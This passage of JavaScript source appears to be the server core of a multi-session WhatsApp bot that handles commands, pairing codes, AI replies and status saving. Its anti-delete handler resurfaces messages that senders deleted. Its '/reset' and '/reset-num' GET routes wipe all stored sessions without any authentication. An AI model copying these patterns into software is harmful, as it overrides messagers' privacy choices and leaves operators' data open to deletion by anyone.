  const myBotJid = sock.user?.id || '';
  const myBotNum = myBotJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '') || phoneNumber.replace(/[^0-9]/g, '');
  const settings = await getBotSettings(myBotNum);

  if (settings.autoChatRead && !msg.key.fromMe) {
    sock.readMessages([msg.key]).catch(() => {});
  }

  if (!msg.key.fromMe) simulateAutoPresence(sock, chatJid, settings);

  if (chatJid === 'status@broadcast') {
    await handleStatusBroadcast(sock, msg, settings);
    return;
  }

  const originalSender = resolveOriginalSender(msg, chatJid, isGroup, myBotJid);
  const resolvedSender = await resolveLidToRealJid(sock, originalSender);
  const isOwner = checkIsOwner(originalSender, resolvedSender);

  const cleanSenderNum = (resolvedSender || originalSender || '').split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
  const isAuthorized = checkIsAuthorizedToControl(isOwner, msg, myBotNum, cleanSenderNum);
  const currentMode = settings.workMode || 'public';

  const rawMsg = unwrapMessageContent(msg.message);
  const text = extractMessageText(rawMsg);
  if (!text) return;

  const quotedContext = msg.message?.extendedTextMessage?.contextInfo;
  const quotedMsgObj = quotedContext?.quotedMessage;
  const safeReply = buildSafeReply(sock, chatJid, msg);
  const cleanInput = text.toLowerCase().trim();

  const settingsOption = isSettingsMenuOption(cleanInput);
  const quotedCaption = extractQuotedCaption(quotedMsgObj);
  const fromSettingsMenu = isQuotedFromSettingsMenu(quotedCaption);
  const fromMainMenu = isQuotedFromMainMenu(quotedCaption);

  if (quotedMsgObj && fromMainMenu && ['1', '2', '3', '4'].includes(cleanInput)) {
    if (!shouldSkipDueToWorkMode(isAuthorized, isGroup, currentMode)) {
      const menuCmd = findCommand('menu', 'help', 'list');
      if (menuCmd) {
        const cmdFunc = getCommandExecutor(menuCmd);
        if (cmdFunc) {
          await cmdFunc(sock, msg, [cleanInput], chatJid, safeReply, { isOwner: isAuthorized, isGroup });
          return;
        }
      }
    }
  }

  if (settingsOption && isAuthorized && fromSettingsMenu && !fromMainMenu) {
    const handled = await handleSettingsMenuReply(sock, msg, cleanInput, chatJid, safeReply, isAuthorized, myBotNum);
    if (handled) return;
  }

  const statusKeywords = ['oni', 'ඕනි', 'ඕනෙ', 'dapan', 'දාපන්', 'ewanna', 'එවන්න', 'save', 'status', 'send'];
  const isQuotedFromStatus = quotedContext?.remoteJid === 'status@broadcast' || quotedContext?.participant?.includes('@broadcast');

  if (quotedMsgObj && (isQuotedFromStatus || statusKeywords.includes(cleanInput))) {
    if (statusKeywords.includes(cleanInput)) {
      const handled = await handleStatusSaveKeyword(sock, msg, cleanInput, chatJid, safeReply, isAuthorized);
      if (handled) return;
    }
  }

  const isCmdHandled = await handlePrefixCommand(sock, msg, text, chatJid, safeReply, isAuthorized, isGroup, isOwner, currentMode, myBotNum);
  if (isCmdHandled) return;

  if (settings.aiChatEnabled && !msg.key.fromMe) {
    if (!shouldSkipDueToWorkMode(isAuthorized, isGroup, currentMode)) {
      await sock.sendPresenceUpdate('composing', chatJid).catch(() => {});
      const aiReply = await askAI(text, originalSender || chatJid);
      if (aiReply) {
        await sock.sendMessage(chatJid, { text: aiReply }, { quoted: msg }).catch(() => {});
      }
    }
  }
}

function registerMessageUpsertHandler(sock, phoneNumber) {
  sock.ev.on('messages.upsert', ({ messages }) => {
    if (!messages || !messages.length) return;
    for (const msg of messages) {
      processSingleMessage(sock, msg, phoneNumber).catch(() => {});
    }
  });
}

function registerMessageUpdateHandler(sock, phoneNumber) {
  sock.ev.on('messages.update', async (updates) => {
    for (const update of updates) {
      try {
        const isRevoke =
          update.update?.messageStubType === WAMessageStubType.REVOKE ||
          update.update?.messageStubType === 68 ||
          update.update?.message?.protocolMessage?.type === 0;

        if (!isRevoke) continue;

        const deletedKey = update.key;
        if (!deletedKey || !deletedKey.id) continue;

        const cachedMsg = globalMsgStore.get(deletedKey.id);
        if (!cachedMsg || !cachedMsg.message) continue;

        await triggerAntiDelete(sock, deletedKey, cachedMsg, phoneNumber);
      } catch (err) {
        console.error('Anti-delete update handler error:', err?.message);
      }
    }
  });
}

// ============================================================================
// 🚀 MAIN WHATSAPP INITIALIZER
// ============================================================================

async function initWhatsApp(phoneNumber) {
  if (activeSessions[phoneNumber]) return activeSessions[phoneNumber];
  if (isStarting[phoneNumber]) return;
  isStarting[phoneNumber] = true;

  try {
    const { sock, clearSessionData } = await createBaileysSocket(phoneNumber);
    activeSessions[phoneNumber] = sock;
    delete isStarting[phoneNumber];

    registerConnectionUpdateHandler(sock, phoneNumber, clearSessionData);
    registerMessageUpsertHandler(sock, phoneNumber);
    registerMessageUpdateHandler(sock, phoneNumber);

    return sock;
  } catch (err) {
    delete isStarting[phoneNumber];
    console.error(`initWhatsApp Error (${phoneNumber}):`, err.message);
  }
}

// ============================================================================
// 🌐 HTTP ROUTES
// ============================================================================

function stopAndRemoveSession(num) {
  if (!activeSessions[num]) return;
  try {
    activeSessions[num].ev.removeAllListeners();
    activeSessions[num].ws?.close();
  } catch (e) {}
  delete activeSessions[num];
}

function registerResetAllRoute(app) {
  app.get('/reset', async (req, res) => {
    try {
      await Auth.deleteMany({});
      if (mongoose.connection.db) {
        await mongoose.connection.db.collection('auths').deleteMany({});
      }
      Object.keys(activeSessions).forEach(num => {
        stopAndRemoveSession(num);
      });
      settingsCache.flushAll();
      res.json({ success: true, message: 'All sessions successfully wiped!' });
    } catch (err) {
      res.status(500).json({ success: false, error: err.message });
    }
  });
}

function registerResetSingleNumberRoute(app) {
  app.get('/reset-num', async (req, res) => {
    let num = req.query.num;
    if (!num) return res.status(400).json({ error: 'Number required' });
    num = num.replace(/[^0-9]/g, '');

    try {
      stopAndRemoveSession(num);
      delete isStarting[num];
      await Auth.deleteMany({ _id: new RegExp('^' + num, 'i') });
      clearSettingsCache(num);
      return res.json({ success: true, message: `Session cleared for ${num}` });
    } catch (err) {
      return res.status(500).json({ error: err.message });
    }
  });
}

function registerPairRoute(app) {
  app.get('/pair', async (req, res) => {
    let num = req.query.num;
    if (!num) return res.status(400).json({ error: 'Phone number is required!' });
    
    num = num.replace(/[^0-9]/g, '');
    if (num.length < 10) {
      return res.status(400).json({ error: 'Invalid phone number format!' });
    }

    stopAndRemoveSession(num);
    delete isStarting[num];

    try {
      await Auth.deleteMany({ _id: new RegExp('^' + num, 'i') });
      await SettingsModel.findByIdAndUpdate(num, { $set: { isFirstConnectDone: false } }, { upsert: true }).catch(() => {});
      clearSettingsCache(num);
    } catch (e) {
      console.error('Session reset error:', e.message);
    }

    let pairSock = null;

    try {
      const { state, saveCreds, clearSessionData } = await useMongoDBAuthState(num);
      const logger = pino({ level: 'silent' });

      pairSock = makeWASocket({
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, logger) },
        logger,
        printQRInTerminal: false,
        browser: Browsers.macOS('Desktop'),
        connectTimeoutMs: 90000,
        defaultQueryTimeoutMs: 90000,
        keepAliveIntervalMs: 30000,
        markOnlineOnConnect: false,
        emitOwnEvents: false
      });

      pairSock.ev.on('creds.update', saveCreds);

      pairSock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        
        if (connection === 'open') {
          activeSessions[num] = pairSock;
          registerConnectionUpdateHandler(pairSock, num, clearSessionData);
          registerMessageUpsertHandler(pairSock, num);
          registerMessageUpdateHandler(pairSock, num);
          handleConnectionOpen(pairSock, num);
        } else if (connection === 'close') {
          const code = lastDisconnect?.error?.output?.statusCode;
          if (code !== DisconnectReason.loggedOut && code !== 401) {
            setTimeout(() => initWhatsApp(num), 6000);
          }
        }
      });

      // Handshake එක settle වීමට තත්පර 6ක් රැඳී සිටීම
      await delay(6000);

      if (!pairSock.authState.creds.registered) {
        let code = await pairSock.requestPairingCode(num);
        code = code?.match(/.{1,4}/g)?.join('-') || code;
        return res.json({ code });
      } else {
        await Auth.deleteMany({ _id: new RegExp('^' + num, 'i') });
        return res.status(400).json({ error: 'Session conflict detected. Please click button again!' });
      }
    } catch (err) {
      console.error(`❌ Pairing Error for ${num}:`, err?.message || err);
      if (pairSock) {
        try {
          pairSock.ev.removeAllListeners();
          pairSock.ws?.close();
        } catch (e) {}
      }
      return res.status(500).json({ 
        error: 'Pairing error: ' + (err?.message || 'Rate-limited. Wait 15 seconds and retry.') 
      });
    }
  });
}

function registerAllHttpRoutes(app) {
  registerPortalRoute(app);
  registerResetAllRoute(app);
  registerResetSingleNumberRoute(app);
  registerPairRoute(app);
}

// ============================================================================
// 🔁 KEEP-ALIVE
// ============================================================================

function startKeepAlivePing() {
  const keepAliveUrl = process.env.RENDER_EXTERNAL_URL;
  if (!keepAliveUrl) return;

  setInterval(async () => {
    try {
      await fetch(keepAliveUrl);
    } catch (e) {}
  }, 2 * 60 * 1000);
}

// ============================================================================
// 🍃 STARTUP
// ============================================================================

async function reconnectAllSavedSessions() {
  try {
    const sessions = await Auth.find({ _id: /-creds$/ }).lean();
    console.log(`☠️ [DARK DINU]: Discovered ${sessions.length} sessions in database.`);

    for (const session of sessions) {
      const pNumber = session._id.split('-creds')[0];
      await initWhatsApp(pNumber);
      await delay(10000);
    }
  } catch (e) {
    console.error('Error reconnecting sessions:', e.message);
  }
}

async function startServer() {
  const app = express();
  const port = process.env.PORT || 3000;
  app.use(express.json());

  loadAllCommands();
  registerAllHttpRoutes(app);

  app.listen(port, () => {
    console.log(`☠️ [DARK DINU CORE ONLINE] Port: ${port}`);
    startKeepAlivePing();
  });

  await reconnectAllSavedSessions();
}

async function main() {
  try {
    await mongoose.connect(MONGODB_URI);
    console.log('☠️ [DARK DINU] MongoDB Mainframe Connected!');
    await startServer();
  } catch (err) {
    console.error('MongoDB Connection Error:', err);
  }
}

main();

